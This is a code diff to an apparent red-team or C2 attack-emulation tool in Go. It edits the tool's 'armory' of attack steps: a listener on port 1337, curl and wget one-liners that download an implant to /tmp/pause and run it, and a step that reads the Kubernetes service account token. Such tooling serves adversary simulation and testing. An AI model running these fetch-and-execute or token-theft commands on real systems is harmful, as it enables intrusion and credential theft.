@@ -89,10 +89,6 @@ func LoadArmory(dir string) (Armory, error) {
 			Command:     domain.StartListener{Port: 1337, Protocol: domain.HTTP},
 			// Port:        1337,
 			CmdVariants: map[string]domain.CmdVariant{},
-			Args: map[string]string{
-				"Port":     "1337",
-				"Protocol": string(domain.HTTP),
-			},
 			// Effects: c2.ListenerReady{},
 		},
 		{
@@ -109,7 +105,7 @@ func LoadArmory(dir string) (Armory, error) {
 			// Cmd:         "sh -c 'wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause'",
 			// Cmd: "sh -c \"wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &\"",
 			CmdVariants: map[string]domain.CmdVariant{
-				"curl": "curl -L $LISTENER:$FILESHARE_PORT/implant -o /tmp/pause && chmod +x /tmp/pause && /tmp/pause &",
+				"curl": `sh -c "curl -L $LISTENER:$FILESHARE_PORT/implant -o /tmp/pause && chmod +x /tmp/pause && /tmp/pause &"`,
 				"wget": "wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &",
 			},
 			Requires: domain.Requirements{AccessLevel: domain.UserExec},
@@ -122,7 +118,7 @@ func LoadArmory(dir string) (Armory, error) {
 				"":       "cat",
 				"sliver": "get_file",
 			},
-			Args:          map[string]string{"TOKEN_PATH": "/var/run/secrets/kubernetes.io/serviceaccount/token"},
+			Args:          map[string]string{"": "/var/run/secrets/kubernetes.io/serviceaccount/token"},
 			Requires:      domain.Requirements{AccessLevel: domain.UserRead},
 			Effects:       []string{"Pod name", "ServiceAccount name", "Namespace name"},
 			ResultHandler: handleSaTokenRead,
